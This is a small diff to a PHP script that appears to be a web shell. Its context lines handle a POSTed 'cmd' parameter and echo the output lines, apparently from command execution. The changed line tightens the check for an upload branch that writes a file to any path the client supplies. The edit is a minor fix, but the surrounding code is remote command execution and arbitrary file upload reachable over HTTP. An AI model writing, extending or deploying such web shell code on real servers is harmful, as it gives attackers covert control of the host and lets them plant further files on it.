@@ -6,7 +6,7 @@ if (ISSET($_POST['cmd'])) {
         echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8')."<br>";
     }
     die(); 
-} else if (ISSET($_FILES['file']['tmp_name']) && ISSET($_POST['path'])) {
+} else if (!empty($_FILES['file']['tmp_name']) && !empty($_POST['path'])) {
     $filename = $_FILES["file"]["name"];
     $path = $_POST['path'];
     if ($path != "/") {
